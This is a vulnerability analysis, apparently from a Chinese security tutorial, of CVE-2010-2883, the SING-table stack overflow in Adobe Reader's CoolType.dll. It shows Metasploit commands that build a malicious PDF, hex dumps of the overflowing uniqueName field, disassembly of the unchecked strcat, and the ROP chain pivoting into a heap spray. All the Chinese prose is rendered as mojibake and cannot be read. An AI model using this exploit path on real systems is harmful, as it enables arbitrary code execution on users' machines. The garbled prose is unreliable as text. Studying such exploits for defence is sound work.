# 7.1.8 CVE-2010-2883 Adobe CoolType SING è¡¨æ ˆæº¢å‡ºæ¼æ´

- [æ¼æ´æè¿°](#æ¼æ´æè¿°)
- [æ¼æ´å¤ç°](#æ¼æ´å¤ç°)
- [æ¼æ´åˆ†æ](#æ¼æ´åˆ†æ)
- [å‚è€ƒèµ„æ–™](#å‚è€ƒèµ„æ–™)

[ä¸‹è½½æ–‡ä»¶](../src/exploit/7.1.8_adobe_reader_2010-2883)

## æ¼æ´æè¿°

Adobe Reader å’Œ Acrobat 9.4 ä¹‹å‰ç‰ˆæœ¬çš„ CoolType.dll ä¸­å­˜åœ¨åŸºäºæ ˆçš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©å¸¦æœ‰ TTF å­—ä½“çš„ Smart INdependent Glyphlets (SING) è¡¨æ ¼ä¸­è¶…é•¿å­—æ®µçš„ PDF æ–‡ä»¶æ‰§è¡Œä»»æ„ä»£ç æˆ–è€…å¯¼è‡´æ‹’ç»æœåŠ¡ã€‚

## æ¼æ´å¤ç°

| |æ¨èä½¿ç”¨çš„ç¯å¢ƒ | å¤‡æ³¨ |
| --- | --- | --- |
| æ“ä½œç³»ç»Ÿ | Windows XP SP3 | ä½“ç³»ç»“æ„ï¼š32 ä½ |
| è°ƒè¯•å™¨ | OllyDbg | ç‰ˆæœ¬å·ï¼šå¾çˆ±ä¸“ç‰ˆ |
| åæ±‡ç¼–å™¨ | IDA Pro | ç‰ˆæœ¬å·ï¼š6.8 |
| æ¼æ´è½¯ä»¶ | Adobe Reader | ç‰ˆæœ¬å·ï¼š9.3.4 |

æˆ‘ä»¬åˆ©ç”¨ Metasploit æ¥ç”Ÿæˆæ”»å‡»æ ·æœ¬ï¼š

```text
msf > search cve-2010-2883
   Name                                            Disclosure Date  Rank   Description
   ----                                            ---------------  ----   -----------
   exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow

msf > use exploit/windows/fileformat/adobe_cooltype_sing
msf exploit(windows/fileformat/adobe_cooltype_sing) > show info

msf exploit(windows/fileformat/adobe_cooltype_sing) > set payload windows/exec
payload => windows/exec

msf exploit(windows/fileformat/adobe_cooltype_sing) > set cmd calc.exe
cmd => calc.exe

msf exploit(windows/fileformat/adobe_cooltype_sing) > set filename cve20102883.pdf
filename => cve20102883.pdf

msf exploit(windows/fileformat/adobe_cooltype_sing) > exploit
[*] Creating 'cve20102883.pdf' file...
[+] cve20102883.pdf stored at /home/firmy/.msf4/local/cve20102883.pdf
```

ä½¿ç”¨æ¼æ´ç‰ˆæœ¬çš„ Adobe Reader æ‰“å¼€æ ·æœ¬ï¼Œå³å¯å¼¹å‡ºè®¡ç®—å™¨ã€‚

## æ¼æ´åˆ†æ

### PDF æ–‡ä»¶æ ¼å¼

é¦–å…ˆå½“ç„¶å¾—çŸ¥é“ PDF æ ¼å¼æ˜¯æ€æ ·çš„ã€‚

```text
|------------|
|   header   |
|------------|
|    body    |
|------------|
| xref table |
|------------|
|  trailer   |
|------------|
```

ç”± 4 ä¸ªéƒ¨åˆ†ç»„æˆï¼š

- headerï¼šæ–‡ä»¶çš„ç¬¬ä¸€è¡Œï¼ŒæŒ‡æ˜äº† PDF æ–‡ä»¶çš„ç‰ˆæœ¬å·ï¼Œé€šå¸¸æ ¼å¼æ˜¯ `%PDF-1.x`ã€‚
- bodyï¼šæ–‡ä»¶çš„ä¸»ä½“éƒ¨åˆ†ï¼Œé€šå¸¸ç”±å¯¹è±¡æ–‡ä»¶ç»„æˆï¼ŒåŒ…æ‹¬æ–‡æœ¬ã€å›¾ç‰‡å’Œå…¶ä»–çš„å¤šåª’ä½“æ–‡ä»¶ç­‰ã€‚
- xref tableï¼šåŒ…å«äº†å¯¹æ–‡ä»¶ä¸­æ‰€æœ‰å¯¹è±¡çš„å¼•ç”¨ï¼Œé€šè¿‡å®ƒå¯ä»¥çŸ¥é“æ–‡ä»¶ä¸­æœ‰å¤šå°‘å¯¹è±¡ã€å¯¹è±¡çš„åç§»ä»¥åŠå­—èŠ‚é•¿åº¦ã€‚
- trailerï¼šåŒ…å«æŒ‡å‘äº¤å‰å¼•ç”¨è¡¨ä»¥åŠå…³é”®å¯¹è±¡çš„æŒ‡é’ˆï¼Œå¹¶ä»¥ `%%EOF` æ ‡è®°æ–‡ä»¶ç»“æŸã€‚

å½“æˆ‘ä»¬å¯¹ä¸€ä¸ª PDF æ–‡ä»¶æ‰§è¡Œ Saveï¼ˆä¿å­˜ï¼‰æ“ä½œæ—¶ï¼Œæ–°æ·»åŠ çš„ä¿¡æ¯å°†ä¼šé™„åŠ åˆ°åŸæ–‡ä»¶çš„æœ«å°¾ï¼Œå³æ‰€è°“çš„å¢é‡ä¿å­˜ã€‚è¿™äº›ä¿¡æ¯ä¸»è¦ç”± 3 éƒ¨åˆ†ï¼ˆbody changes, xref, trailerï¼‰ç»„æˆï¼Œæ­¤æ—¶çš„ PDF æ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼š

```text
|--------------|
|    header    |    ------------
|--------------|
|     body     |
|--------------|    Original File
|  xref table  |
|--------------|
|   trailer    |    ------------
|--------------|
| body changes |
|--------------|    Update 1
|     xref     |
|--------------|
|   trailer    |    ------------
|--------------|
|     ...      |    ...
|--------------|
| body changes |    ------------
|--------------|
|     xref     |    Update n
|--------------|
|   trailer    |    ------------
|--------------|
```

è¿™æ ·å­è™½ç„¶æ–¹ä¾¿ï¼Œä½†ä½“ç§¯ä¼šè¶Šæ¥è¶Šå¤§ã€‚æ­¤æ—¶æˆ‘ä»¬å¯ä»¥æ‰§è¡Œ Save asï¼ˆå¦å­˜ä¸ºï¼‰æ“ä½œï¼Œå°†æ‰€æœ‰çš„æ›´æ–°ä¿¡æ¯åˆå¹¶æˆä¸€ä¸ªå®Œæ•´çš„æ–°çš„ PDFï¼Œæ ¼å¼å›åˆ°ä¸€å¼€å§‹çš„ç»“æ„ï¼Œä½“ç§¯ä¹Ÿç›¸åº”çš„æœ‰æ‰€å‡å°ã€‚

ä¾‹å¦‚å¯ä»¥åˆ©ç”¨å·¥å…· PDFStreamDumper è§£ææˆ‘ä»¬çš„æ ·æœ¬ï¼Œå…¶ xref å’Œ trailer å¦‚ä¸‹æ‰€ç¤ºï¼š

```text
xref
0 15
0000000000 65535 f
0000000015 00000 n
0000000133 00000 n
0000000264 00000 n
0000000294 00000 n
0000000334 00000 n
0000000465 00000 n
0000000497 00000 n
0000000713 00000 n
0000000835 00000 n
0000001006 00000 n
0000041366 00000 n
0000041449 00000 n
0000045319 00000 n
0000045358 00000 n
trailer
<</S#69#7a#65 15/R#6f#6f#74 1 0 R>>
startxref
45789
%%EOF
.
```

è¯¥èŠ‚åŒºçš„å¯¹è±¡çš„èµ·å§‹ç¼–å·ä¸º 0,åŒ…å«çš„å¯¹è±¡ä¸ªæ•°ä¸º 15 ä¸ªï¼Œæ¯ä¸ªå¯¹è±¡åœ¨äº¤å‰å¼•ç”¨è¡¨ä¸­å æ®ä¸€è¡Œã€‚æˆ‘ä»¬çœ‹åˆ°æ¯è¡Œåˆ†ä¸ºä¸‰åˆ—ï¼Œåˆ†åˆ«è¡¨ç¤ºå¯¹è±¡åœ¨ PDF ä¸­çš„æ–‡ä»¶åç§»ã€å¯¹è±¡çš„ç”Ÿæˆå·å’Œæ˜¯å¦ä½¿ç”¨æ ‡å¿—ï¼ˆ`f` è¡¨ç¤º freeï¼Œn è¡¨ç¤º usedï¼‰ã€‚ç¬¬ä¸€è¡Œå¯¹åº”çš„å¯¹è±¡ ID ä¸º 0ï¼Œç”Ÿæˆå·æ€»æ˜¯ 65535ï¼Œè€Œæœ€åä¸€è¡Œçš„ç”Ÿæˆå·æ€»æ˜¯ 0ã€‚

### TTF æ–‡ä»¶æ ¼å¼

æ ¹æ®æ¼æ´é€šå‘Šï¼Œæˆ‘ä»¬çŸ¥é“æ˜¯ TTF å­—ä½“çš„ SING è¡¨å¼•èµ·çš„æº¢å‡ºã€‚æ‰€ä»¥å†æ¥çœ‹ä¸€ä¸‹ TTF æ–‡ä»¶æ ¼å¼ã€‚

TTF åŒ…å«æœ‰ä¸€ä¸ªè¡¨ TableDirectoryï¼Œå…¶ä¸­æœ‰ä¸€ä¸ª TableEntry ç»“æ„é¡¹ï¼ŒåŒ…å«äº†èµ„æºæ ‡è®°ã€æ ¡éªŒå’Œã€åç§»é‡å’Œæ¯ä¸ªè¡¨çš„å¤§å°ï¼š

```c
typedef sturct
{
    char    tag[4];
    ULONG   checkSum;
    ULONG   offset;
    ULONG   length;
} TableEntry;

typedef struct
{
    Fixed   sfntversion;
    USHORT  numTables;
    USHORT  searchRange;
    USHORT  entrySelector;
    USHORT  rangeShift;
    TableEntry  entries[numTables];
} TableDirectory;
```

å¦å¤–ï¼ŒSING è¡¨çš„ç»“æ„å¦‚ä¸‹ï¼š

```c
typedef struct
{
    USHORT  tableVersionMajor;
    USHORT  tableVersionMinor;
    USHORT  glyphletVersion;
    USHORT  embeddinginfo;
    USHORT  mainGID;
    USHORT  unitsPerEm;
    SHORT   vertAdvance;
    SHORT   vertOrigin;
    BYTE[28]    uniqueName;
    BYTE[16]    METAMD5;
    BYTE    nameLength;
    BYTE[]  baseGlyphName;
} SINGTable;
```

è¿˜æ˜¯åˆ©ç”¨ PDFStreamDumperï¼Œä»æ ·æœ¬é‡Œå°† TTF å–å‡ºæ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ TTF é‡‡ç”¨å¤§ç«¯åºã€‚

<pre>
$ xxd -g1 hexC0E5.tmp | grep -A1 "SING"
000000e0: 05 47 06 3a 00 00 eb 2c 00 00 00 20 <b>53 49 4e 47</b>  .G.:...,... SING
000000f0: <b>d9 bc c8 b5 00 00 01 1c 00 00 1d df</b> 70 6f 73 74  ............post
</pre>

åŠ ç²—éƒ¨åˆ†å³ SING è¡¨ç›®å½•é¡¹ï¼Œå…¶ `offset` åŸŸä¸º `0x0000011c`ã€‚

äºæ˜¯æ‰¾åˆ° SING è¡¨ï¼Œå…¶ä¸­åŠ ç²—éƒ¨åˆ†ä¸º `uniqueName` åŸŸï¼š

<pre>
$ xxd -g1 hexC0E5.tmp | grep -A3 "00000110"
00000110: 3b 07 f1 00 00 00 20 f8 00 00 05 68 00 00 01 00  ;..... ....h....
00000120: 01 0e 00 01 00 00 00 00 00 00 00 3a <b>92 f3 5e 4d  ...........:..^M
00000130: 73 5d 52 c2 14 a7 82 4a 0c 0c 0c 0c bc 94 b0 83  s]R....J........
00000140: 45 a2 04 7d 13 4b 30 18</b> 98 95 ed 9f 3e cc 50 8b  E..}.K0.....>.P.
</pre>

### æ ˆæº¢å‡º

æˆ‘ä»¬å·²ç»çŸ¥é“æ ˆæº¢å‡ºå‘ç”Ÿåœ¨ SING è¡¨çš„å¤„ç†ä¸­ï¼Œäºæ˜¯åœ¨ IDA ä¸­æ‰“å¼€ CoolType.dllï¼Œæœç´¢å­—ç¬¦ä¸² "SING"ï¼š

```text
.rdata:0819DB4C ; char aSing[]
.rdata:0819DB4C aSing           db 'SING',0             ; DATA XREF: sub_8015AD9+D2â†‘o
.rdata:0819DB4C                                         ; sub_803DCF9+7Bâ†‘o ...
.rdata:0819DB51                 align 4
```

å¯¹æ¯ä¸ªæ•°æ®å¼•ç”¨è¿›è¡Œæ£€æŸ¥ï¼Œå‘ç° `sub_803DCF9+7Bâ†‘o` çš„ä¸‹æ–¹å­˜åœ¨å±é™©å‡½æ•° `strcat`ï¼š

```text
.text:0803DCF9 ; __unwind { // loc_8184A54
.text:0803DCF9                 push    ebp
.text:0803DCFA                 sub     esp, 104h            ; åˆ†é…æ ˆç©ºé—´ 104h
.text:0803DD00                 lea     ebp, [esp-4]         ; ebp èµ‹å€¼ä¸º esp-4
.text:0803DD04                 mov     eax, ___security_cookie
.text:0803DD09                 xor     eax, ebp
.text:0803DD0B                 mov     [ebp+108h+var_4], eax
.text:0803DD11                 push    4Ch
.text:0803DD13                 mov     eax, offset loc_8184A54
.text:0803DD18                 call    __EH_prolog3_catch
.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]
.text:0803DD23                 mov     edi, [ebp+108h+arg_0]    ; edi èµ‹å€¼ä¸º arg_0
.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]
.text:0803DD2F                 mov     [ebp+108h+var_130], edi
.text:0803DD32                 mov     [ebp+108h+var_138], eax
.text:0803DD35                 call    sub_804172C
.text:0803DD3A                 xor     esi, esi
.text:0803DD3C                 cmp     dword ptr [edi+8], 3
.text:0803DD40 ;   try {
.text:0803DD40                 mov     [ebp+108h+var_10C], esi
.text:0803DD43                 jz      loc_803DF00
.text:0803DD49                 mov     [ebp+108h+var_124], esi
.text:0803DD4C                 mov     [ebp+108h+var_120], esi
.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1
.text:0803DD4F ;   } // starts at 803DD40
.text:0803DD53 ;   try {
.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1
.text:0803DD57                 jnz     loc_803DEA9
.text:0803DD5D                 push    offset aName    ; "name"
.text:0803DD62                 push    edi             ; int
.text:0803DD63                 lea     ecx, [ebp+108h+var_124]
.text:0803DD66                 mov     [ebp+108h+var_119], 0
.text:0803DD6A                 call    sub_80217D7
.text:0803DD6F                 cmp     [ebp+108h+var_124], esi
.text:0803DD72                 jnz     short loc_803DDDD
.text:0803DD74                 push    offset aSing    ; "SING"
.text:0803DD79                 push    edi             ; int
.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]  ; this æŒ‡é’ˆçš„åœ°å€ï¼ŒæŒ‡å‘ SING è¡¨å…¥å£
.text:0803DD7D                 call    sub_8021B06              ; sub_8021B06(edi, "SING")ï¼Œå¤„ç† SING è¡¨
.text:0803DD82                 mov     eax, [ebp+108h+var_12C]
.text:0803DD85                 cmp     eax, esi         ; åˆ¤æ–­æ˜¯å¦ä¸ºç©º
.text:0803DD85 ;   } // starts at 803DD53
.text:0803DD87 ;   try {
.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2
.text:0803DD8B                 jz      short loc_803DDC4        ; ä¸è·³è½¬
.text:0803DD8D                 mov     ecx, [eax]               ; SING è¡¨å¼€å¤´ 4 å­—èŠ‚ï¼Œå³å­—ä½“èµ„æºç‰ˆæœ¬å·ï¼ˆ00 01 00 00ï¼‰
.text:0803DD8F                 and     ecx, 0FFFFh              ; ç»“æœä¸º 0
.text:0803DD95                 jz      short loc_803DD9F        ; è·³è½¬
.text:0803DD97                 cmp     ecx, 100h
.text:0803DD9D                 jnz     short loc_803DDC0
.text:0803DD9F
.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Câ†‘j
.text:0803DD9F                 add     eax, 10h                 ; uniqueName åŸŸ
.text:0803DDA2                 push    eax             ; Source ; æŒ‡å‘ uniqueName çš„æŒ‡é’ˆ
.text:0803DDA3                 lea     eax, [ebp+108h+Dest]
.text:0803DDA6                 push    eax             ; Dest   ; ç›®çš„åœ°å€æ˜¯å›ºå®šå¤§å°çš„æ ˆç©ºé—´
.text:0803DDA7                 mov     [ebp+108h+Dest], 0
.text:0803DDAB                 call    strcat                   ; é€ æˆæº¢å‡º
```

åœ¨è°ƒç”¨ strcat å‡½æ•°æ—¶ï¼Œæœªå¯¹ uniqueName çš„å­—ç¬¦ä¸²é•¿åº¦è¿›è¡Œæ£€æŸ¥ï¼Œç›´æ¥å°†å…¶å¤åˆ¶åˆ°å›ºå®šå¤§å°çš„æ ˆç©ºé—´ï¼Œé€ æˆæº¢å‡ºã€‚strcat å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š

```c
char *strcat(char *dest, const char *src);

char *strncat(char *dest, const char *src, size_t n);
```

ä¸‹é¢æ‰“å¼€ OllyDbg è°ƒè¯•ä¸€ä¸‹ï¼Œå…ˆæ¥çœ‹çœ‹å‡½æ•° `sub_8021B06` åšäº†ä»€ä¹ˆï¼Œåœ¨ `0803DD7D` è®¾ç½®æ–­ç‚¹ï¼Œç„¶ååœ¨ Reader ä¸­æ‰“å¼€æ ·æœ¬ï¼Œç¨‹åºå°±æ–­äº†ä¸‹æ¥ï¼š

```text
0803DD7D    E8 843DFEFF     call CoolType.08021B06
0803DD82    8B45 DC         mov eax,dword ptr ss:[ebp-0x24]
```

æ­¤æ—¶çš„ this æŒ‡é’ˆæŒ‡å‘ TTF å¯¹è±¡ï¼š

<pre>
d ecx:

0012E4B4  <b>B0 54 18 02</b> 98 15 FC 01 00 00 00 00 00 00 00 00  ç™Ÿ??........

d 021854B0:

021854B0  00 01 00 00 00 11 01 00 00 04 00 10 4F 53 2F 32  .......OS/2     <-- TableDirectory
021854C0  B4 5F F4 63 00 00 EB 70 00 00 00 56 50 43 4C 54  ç¢ºé¬°..é›™...VPCLT
...
</pre>

ç„¶å F8 å•æ­¥æ­¥è¿‡ï¼Œeax é‡Œæ˜¯å‡½æ•°çš„è¿”å›å€¼ `0012E4B4`ï¼Œå…¶å€¼ç­‰äº this æŒ‡é’ˆçš„åœ°å€ã€‚

<pre>
d 0012E4B4:

0012E4B4  <b>38 B9 7D 04</b> DF 1D 00 00 00 00 00 00 00 00 00 00  8ç®?..........
</pre>

ä¸‹ä¸€å¥ç»™ eax èµ‹å€¼ä¸ºä¸€ä¸ªæŒ‡å‘ SING è¡¨çš„æŒ‡é’ˆï¼Œå³ this æŒ‡é’ˆçš„å†…å®¹ã€‚

<pre>
d 047DB938:

047DB938  <b>00 00 01 00</b> 01 0E 00 01 00 00 00 00 00 00 00 3A  ...........:      <-- SING
047DB948  <b>92 F3 5E 4D 73 5D 52 C2 14 A7 82 4A 0C 0C 0C 0C</b>  æ¦^Ms]R?î‡J....      <-- uniqueName
047DB958  <b>BC 94 B0 83 45 A2 04 7D 13 4B 30 18</b> 98 95 ED 9F  ç´¨çšŸE?}K0æ§™é        <-- 0x1c bytes
047DB968  3E CC 50 8B AC FE B5 5C 8F 86 D5 26 8B 36 0C 13  >è˜Œå«­î‘¼\å¼³??.
047DB978  25 2D 1F C3 0E 47 40 13 C9 1C 5F 86 90 AC 42 6D  %-?G@?_å•‡çºm
047DB988  40 44 C6 D4 59 9A AC 7D 1B E1 CA 25 3E E4 B3 05  @DåœƒYæ¯ˆ}å´¾%>æ¶‘
047DB998  0D 85 43 B3 D9 58 4E 7E B9 A3 6D 4C 89 29 1D FE  .åŒ”è¿ŸXN~æ¢—mL?
047DB9A8  73 9A C4 84 6C 29 7A 5D 6D 7B 6E 1C 39 E0 1E E4  sæ¯®åˆ²)z]m{n9?
047DB9B8  51 7A 86 DE 7B FB 6F 04 B0 CF 3E E0 CF 4C AB FA  Qzå—ˆ{é¹¢è·‹>å˜Lî‚·
047DB9C8  71 41 CD 19 69 68 4E F6 35 A1 B5 3C 66 77 F2 45  qA?ihN?ã€‰ fwé§¿
047DB9D8  71 73 01 C0 19 F4 A4 E1 D9 8A 8B C2 85 83 EA 2F  qs?ç°¸è±³å¦ºèŸå†´/
047DB9E8  6E ED 57 4D E6 B7 7F 88 48 BD 16 8E DC 51 9E 7E  né¼Må¨£åœš?åºˆQç€ª
047DB9F8  BE 8B 09 8E 53 50 ED A9 F1 AC AE AD 01 5C 1E 11  ç·¥.å¶´Pæ„†ç˜³î†„\
047DBA08  33 06 83 44 4B 4A EC 9F 26 3A AF 0A 74 62 C5 1E  3åƒKJéœ&:?tb?
047DBA18  AE A8 58 3F F3 F1 82 F0 4D AC DA AE 10 AB 02 B9  î…¿X?ç¯‘å‚ªMîƒµ??
047DBA28  E2 03 EF F6 76 B4 EF 35 4D 8D 45 3B F4 FE 9A D0  ?ç§­vè¾¾5Må²´;é…¤æ¯¿
047DBA38  58 AE 97 E5 D7 D8 EF 62 2F 4E 30 D6 B8 B4 A2 73  Xç•»é„ä»«b/N0æŒ‡å‚¨s
047DBA48  E3 B7 84 6A A9 41 CE 16 CC FB 8B 1D 43 1B B5 DB  æƒ´åˆ¯ã€¢?å¸–?Cå¸
047DBA58  1D 60 EC BE C1 47 BA 2A 03 DD 3A C4 E1 93 74 1D  `ç‚€ç½£??å°¼æ•
047DBA68  66 41 B0 85 B8 2A 5E DE 39 C9 5D 97 ED 1B 82 65  fAçš¡?^?è’¥æ¥‰ä¿¥
047DBA78  C6 08 8A 4A E5 20 41 0C 26 0A 03 AA 46 C5 36 C9  ?å¥?A.&.ç‹¥?
047DBA88  CB 76 1D C4 56 BD 76 A3 34 F7 2B 79 1F 6D 51 2C  è—‡è…£çµ­??ymQ,
047DBA98  9F 79 21 5E A8 94 1B 4A 05 BF B3 7C BC B2 FD 99  ç„¬!^ã€Jç |ç–¾é¾£
047DBAA8  E5 B3 08 D2 BC 86 25 BB C1 F8 DE F3 4A C8 1E 82  å®„å£¹?æ¶£î‰±é©¤?
047DBAB8  25 12 18 C2 A9 F1 E6 36 92 94 01 29 98 A3 F5 A3  %æ¼çŸœ6æŒƒ)æ§ªé…°
047DBAC8  25 4B 02 0D 17 F2 87 B1 99 A5 8F 6F AA 81 21 64  %K.é©€ç“îš”oçŠ!d
047DBAD8  B8 57 11 6D CF 88 FC B8 22 B9 2B 58 66 CF D2 8B  ç«mè „îƒ"?Xfå¼¦
047DBAE8  F8 12 D6 82 CC B3 5E 28 B4 85 51 54 23 2B 74 21  ?è¬§å›^(ç£ªQT#+t!
047DBAF8  FC 6D 97 08 96 0D BE 76 F5 46 04 72 A6 7B CA 29  é»°??ç·‘é®‚rî›¡?
047DBB08  07 C6 41 55 B2 48 D9 F5 C7 E3 0C 35 1E DA 06 BF  è‰«Uç­è„”å€¾.5?
047DBB18  D3 62 D4 D3 D4 A8 D3 AF A1 17 09 13 E1 5B 18 FD  è§”æ‚æ¸Šç›ˆ?.é†„
047DBB28  ED 04 43 AC 1C 6F A6 1E 02 64 49 D1 5F 5E 54 75  ?C?o?dIè£š^Tu
047DBB38  A7 24 35 67 FF CC E6 E0 <b>38 CB 80 4A</b> 44 B6 49 EA  ?5gï£µæ›¿?è—”JDç¦        <-- ROP
047DBB48  A5 2D 16 26 4B B1 FA D2 87 82 36 34 9C F8 BD E0  ?&KæŸ„è¦ˆ?4æ»§æ´
047DBB58  7D 33 0F 1E 66 5B 23 98 E3 1A 80 55 CE 9F D3 BD  }3f[#æ¨¸â‚¬Uè£å’
047DBB68  CE 3C 13 48 AF 4D BA 78 DB 4E EA 5F 34 3F 14 8C  ?Hç–¢ç°’è·±é˜“4?
047DBB78  80 56 8D 65 A8 84 38 6D 91 4E B1 54 6C 00 00 00  â‚¬Vå³â–Œ8mæ…›ç›©l...              <-- 0x22d bytes
</pre>

æ‰€ä»¥è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å·²ç»æ¸…æ¥šäº†ï¼Œé€šè¿‡ä¼ å…¥çš„ tag å­—ç¬¦ä¸²ï¼Œåœ¨ this æŒ‡é’ˆæŒ‡å‘çš„ TTF å¯¹è±¡é‡Œæ‰¾åˆ°å¯¹åº”çš„è¡¨ç›®å½•é¡¹ï¼Œä½¿ç”¨è¡¨åœ°å€é‡ç½® this æŒ‡é’ˆã€‚

æ¥ä¸‹æ¥å°±æ˜¯ strcat å‡½æ•°äº†ã€‚

```text
0803DD9F    83C0 10         add eax,0x10
0803DDA2    50              push eax
0803DDA3    8D45 00         lea eax,dword ptr ss:[ebp]
0803DDA6    50              push eax
0803DDA7    C645 00 00      mov byte ptr ss:[ebp],0x0
0803DDAB    E8 483D1300     call <jmp.&MSVCR80.strcat>
```

æ ¹æ®ä¸Šé¢çš„ SING è¡¨å¯ä»¥çœ‹åˆ°ï¼Œ`uniqueName` åŸæœ¬åªåº”è¯¥æœ‰æœ€å¤š `0x1c` ä¸ªå­—èŠ‚ï¼Œä½† strcat æ ¹æ® "\x00" æ¥ä½œä¸ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œå°†å¯¼è‡´å¤åˆ¶ `0x22d` ä¸ªå­—èŠ‚åˆ°æ ˆä¸Šï¼Œé€ æˆæº¢å‡ºã€‚

### ROP

æˆ‘ä»¬å¯¹å¤åˆ¶åˆ°æ ˆä¸Šçš„è¿™æ®µæ•°æ®ï¼ˆ`0012E4D8`~`0012E714`ï¼‰è®¾ç½®å†…å­˜è®¿é—®æ–­ç‚¹ã€‚å¹¶å¼€å¯ run trace è¿›è¡Œå‡½æ•°è·Ÿè¸ªã€‚

ç»§ç»­è¿è¡Œï¼Œç„¶åæˆ‘ä»¬è®°å½•ä¸‹å‡½æ•°è°ƒç”¨ï¼š

```text
CoolType.08016BDE --> CoolType.0801BB21 --> CoolType.0808B116 --> icucnv36.4A80CB38
```

```text
0803DEAC    50              push eax
0803DEAD    53              push ebx
0803DEAE    57              push edi
0803DEAF    E8 2A8DFDFF     call CoolType.08016BDE
```

`CoolType.08016BDE`ï¼š

```text
08016C46    6A 01           push 0x1
08016C48    53              push ebx
08016C49    53              push ebx
08016C4A    8D45 EC         lea eax,dword ptr ss:[ebp-0x14]
08016C4D    50              push eax
08016C4E    8D45 D0         lea eax,dword ptr ss:[ebp-0x30]
08016C51    50              push eax
08016C52    57              push edi
08016C53    FF75 E8         push dword ptr ss:[ebp-0x18]
08016C56    E8 C64E0000     call CoolType.0801BB21
```

`CoolType.0801BB21`ï¼š

```text
0801BB24    FF75 20         push dword ptr ss:[ebp+0x20]
0801BB27    8B4D 08         mov ecx,dword ptr ss:[ebp+0x8]
0801BB2A    FF75 1C         push dword ptr ss:[ebp+0x1C]
0801BB2D    8B01            mov eax,dword ptr ds:[ecx]               ; CoolType.081A601C
0801BB2F    FF75 18         push dword ptr ss:[ebp+0x18]
0801BB32    FF05 A0A62308   inc dword ptr ds:[0x823A6A0]
0801BB38    FF75 14         push dword ptr ss:[ebp+0x14]
0801BB3B    FF75 10         push dword ptr ss:[ebp+0x10]
0801BB3E    FF75 0C         push dword ptr ss:[ebp+0xC]
0801BB41    FF10            call dword ptr ds:[eax]                  ; CoolType.0808B116
```

æœ€ç»ˆæ¥åˆ° `CoolType.0808B116` é‡Œçš„å…³é”®ç‚¹ï¼š

```text
0808B11D    8B7D 08         mov edi,dword ptr ss:[ebp+0x8]
...
0808B2E3    8B47 3C         mov eax,dword ptr ds:[edi+0x3C]         ; eax = ds:[edi+0x3C]
0808B2E6    3BC3            cmp eax,ebx
0808B2E8    8986 F4020000   mov dword ptr ds:[esi+0x2F4],eax
0808B2EE    899E F8020000   mov dword ptr ds:[esi+0x2F8],ebx
0808B2F4    895D FC         mov dword ptr ss:[ebp-0x4],ebx
0808B2F7    75 07           jnz short CoolType.0808B300
0808B2F9    32C0            xor al,al
0808B2FB    E9 94020000     jmp CoolType.0808B594
0808B300    8D4D FC         lea ecx,dword ptr ss:[ebp-0x4]
0808B303    51              push ecx
0808B304    53              push ebx
0808B305    6A 03           push 0x3
0808B307    50              push eax
0808B308    FF10            call dword ptr ds:[eax]                  ; icucnv36.4A80CB38
```

é€šè¿‡æœ€åçš„ call æŒ‡ä»¤ï¼Œç¨‹åºè·³è½¬åˆ°äº† ROP é“¾ã€‚å›å¿†ä¸€ä¸‹ uniqueName åŸŸä» `0012E4D8` å¼€å§‹ï¼š

```text
4A80CB38    81C5 94070000   add ebp,0x794   ; ebp = 0012E4DC
4A80CB3E    C9              leave           ; esp = 0012E4E0, ebp = C2525D73
4A80CB3F    C3              retn            ; esp = 0012E4E4, eip = 4A82A714

d esp:

0012E4E4  0C 0C 0C 0C BC 94 B0 83 45 A2 04 7D 13 4B 30 18  ....ç´¨çšŸE?}K0
0012E4F4  98 95 ED 9F 3E CC 50 8B AC FE B5 5C 8F 86 D5 26  æ§™é >è˜Œå«­î‘¼\å¼³?
```

äºæ˜¯è·³è½¬åˆ° `4A82A714`ï¼š

```text
4A82A714    5C              pop esp         ; esp = 0C0C0C0C
4A82A715    C3              retn            ; esp = 0C0C0C10, eip = 4A8063A5
```

åœ¨è¿›å…¥ä¸‹é¢çš„å†…å®¹å‰ï¼Œæˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸ªä¸œè¥¿ï¼Œå³ `eax` æ˜¯ç”± `edi` æ§åˆ¶çš„ï¼Œé€šè¿‡å¯¹å‡½æ•°è°ƒç”¨çš„å›æº¯ï¼Œå¯ä»¥çœ‹åˆ°ç¨‹åºå¯¹ edi çš„å¤„ç†ï¼Œå®ƒçš„å€¼åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­éƒ½æ˜¯ä¸å˜çš„ï¼Œè€Œä¸” edi+0x3C æ­£å¥½å­˜æ”¾ç¬¬ä¸€ä¸ª gadget çš„åœ°å€ã€‚æ‰€ä»¥åªè¦è¿™ä¸ªåœ°å€è¢«è¦†ç›–ï¼Œå°±å¯ä»¥æ§åˆ¶ EIP äº†ã€‚

<pre>
d edi+0x3C:

0012E754  <b>D0 E6 12 00</b> 00 00 00 00 00 AA 04 08 00 00 00 00  å¢Ÿ......?....    <-- eax

d 0012E6D0:

0012E6D0  <b>38 CB 80 4A</b> 44 B6 49 EA A5 2D 16 26 4B B1 FA D2  8è—”JDç¦è¾š-&KæŸ„    <-- ROP
</pre>

### Heap spray

ä¸Šé¢çš„ gadget è¿”å›åï¼Œå †æ ˆå°±è¢«è½¬ç§»åˆ° heap spray çš„åœ°æ–¹äº†ã€‚

